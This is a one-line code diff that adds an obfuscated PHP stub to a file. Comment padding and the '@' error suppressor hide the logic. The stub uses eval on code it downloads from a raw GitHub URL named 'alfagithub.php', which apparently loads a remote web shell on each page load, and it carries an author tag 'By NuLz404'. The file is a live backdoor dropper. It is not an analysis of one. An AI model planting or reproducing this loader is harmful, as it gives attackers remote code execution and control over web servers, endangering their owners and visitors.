@@ -1,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/1310NG1337/sasa/main/alfagithub.php"))/******/ /*By NuLz404*/?>
